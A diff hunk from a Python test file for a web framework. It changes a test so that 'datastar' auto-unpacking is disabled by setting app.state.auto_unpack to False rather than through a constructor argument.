@@ -68,8 +68,11 @@ def test_datastar_unpacking_mixed_sources():
 
 
 def test_datastar_unpacking_disabled():
-    """Test that datastar unpacking can be disabled"""
-    app, rt = star_app(auto_unpack=False)
+    """Test that datastar unpacking can be disabled by setting app state"""
+    app, rt = star_app()
+
+    # Manually disable auto_unpack on the app state
+    app.state.auto_unpack = False
 
     @rt("/test")
     def test_route(name: str = "default"):
